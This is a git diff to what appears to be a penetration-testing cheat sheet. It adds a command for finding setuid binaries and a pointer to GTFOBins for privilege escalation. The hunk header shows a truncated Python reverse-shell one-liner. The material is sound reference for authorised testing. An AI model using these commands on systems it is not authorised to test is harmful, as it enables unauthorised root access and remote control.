@@ -4059,6 +4059,10 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 #### <ins>SUID / SGID Executables</ins>
 
+**setuid + GTFOBins**
+- Check for setuid binaries on the machine `find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null`
+- Use [GTFOBins](https://gtfobins.github.io/) to elevate your privileges
+
 **Known Exploits**
 - Search for all the SUID/SGID executables on the Linux Machine `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
 - Use [Exploit-DB](https://www.exploit-db.com/), Google and GitHub to find known exploits
